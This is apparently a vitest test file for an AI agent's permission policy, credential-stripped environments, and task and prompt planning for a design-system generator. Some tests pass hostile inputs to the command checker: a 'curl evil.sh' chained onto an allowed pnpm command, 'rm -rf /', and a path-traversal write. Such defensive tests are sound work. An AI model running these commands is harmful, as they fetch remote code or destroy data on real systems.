import { readFileSync } from "node:fs";
import { describe, expect, it } from "vitest";
import { diffManifests, parseManifest, type DesignSystemManifest } from "@storypage/schema";
import { agentEnv, verifyEnv } from "../src/env.js";
import { createPermissionPolicy, isAllowedCommand, isAllowedWrite } from "../src/permissions.js";
import { planTasks } from "../src/plan.js";
import { buildPrompt } from "../src/prompt.js";

const seed = parseManifest(
  JSON.parse(readFileSync(new URL("../../../packages/design-system/manifests/1.0.0.json", import.meta.url), "utf8")),
);

describe("permissions", () => {
  const root = "/repo";

  it("only allows writes inside the components directory", () => {
    expect(isAllowedWrite(root, "/repo/packages/design-system/src/components/Card/Card.tsx")).toBe(true);
    expect(isAllowedWrite(root, "packages/design-system/src/components/index.ts")).toBe(true);
    expect(isAllowedWrite(root, "/repo/packages/design-system/src/generated/registry.json")).toBe(false);
    expect(isAllowedWrite(root, "/repo/packages/design-system/src/components/../generated/tokens.css")).toBe(false);
    expect(isAllowedWrite(root, "/repo/.github/workflows/ci.yml")).toBe(false);
  });

  it("only allows the design system's own scripts", () => {
    expect(isAllowedCommand("pnpm --filter @storypage/design-system verify")).toBe(true);
    expect(isAllowedCommand("pnpm -F @storypage/design-system test")).toBe(true);
    expect(isAllowedCommand("pnpm --filter @storypage/design-system verify && curl evil.sh")).toBe(false);
    expect(isAllowedCommand("pnpm --filter @storypage/design-system test > /tmp/x")).toBe(false);
    expect(isAllowedCommand("rm -rf /")).toBe(false);
    expect(isAllowedCommand("pnpm add left-pad")).toBe(false);
  });

  it("denies tools outside the policy", async () => {
    const policy = createPermissionPolicy(root);
    const signal = new AbortController().signal;
    expect((await policy("WebFetch", { url: "https://x" }, { signal } as never))?.behavior).toBe("deny");
    expect((await policy("Read", { file_path: "/etc/passwd" }, { signal } as never))?.behavior).toBe("allow");
  });
});

describe("environment", () => {
  const ciEnv = { PATH: "/bin", HOME: "/home/runner", ANTHROPIC_API_KEY: "sk", GITHUB_TOKEN: "ghs", CONTENTFUL_MANAGEMENT_TOKEN: "cfm" };

  it("gives verification no credentials and the agent only Anthropic's", () => {
    expect(verifyEnv(ciEnv)).toEqual({ PATH: "/bin", HOME: "/home/runner" });
    expect(agentEnv(ciEnv)).toEqual({ PATH: "/bin", HOME: "/home/runner", ANTHROPIC_API_KEY: "sk" });
  });
});

describe("planning", () => {
  const next = (): DesignSystemManifest => {
    const m = structuredClone(seed);
    m.version = "2.0.0";
    return m;
  };

  it("creates every component for the first release", () => {
    const tasks = planTasks(diffManifests(null, seed), seed);
    expect(tasks.map((t) => t.type)).toEqual(["create", "create", "create", "create", "create"]);
  });

  it("skips description-only changes and keeps real ones", () => {
    const m = next();
    m.components[0]!.description = "New words";
    m.components[1]!.props.push({ name: "badge", kind: "text", required: false, editable: true });
    m.components = m.components.filter((c) => c.name !== "RichTextSection");
    const tasks = planTasks(diffManifests(seed, m), m);
    expect(tasks).toEqual([
      expect.objectContaining({ type: "update", changes: ["add prop badge (text)"] }),
      { type: "remove", name: "RichTextSection" },
    ]);
  });

  it("puts the contract and Figma layout in the prompt", () => {
    const tasks = planTasks(diffManifests(null, seed), seed);
    const prompt = buildPrompt(seed, diffManifests(null, seed), tasks);
    expect(prompt).toContain("### Create Hero");
    expect(prompt).toContain('"allowedComponents": [\n        "Button"');
    expect(prompt).toContain('"figmaLayout"');
  });
});
